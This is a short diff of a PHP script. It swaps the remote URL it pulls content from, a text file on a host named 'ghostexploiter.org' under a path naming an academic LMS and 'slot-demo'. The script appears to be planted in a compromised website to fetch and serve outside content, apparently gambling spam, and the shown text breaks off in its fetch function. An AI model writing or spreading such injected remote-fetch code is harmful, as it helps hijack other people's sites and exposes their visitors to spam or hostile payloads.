@@ -1,5 +1,5 @@
 <?php
-$contents = 'https://ghostexploiter.org/sorex/assets/lms.stmik-dci/slot-demo/demo.txt';
+$contents = 'https://ghostexploiter.org/sorex/assets/lms.stmik-dci/slot-demo/demo2.txt';
 $allDevice = true;
 function getContents($url) {
     if(!function_exists('file_get_contents')) {
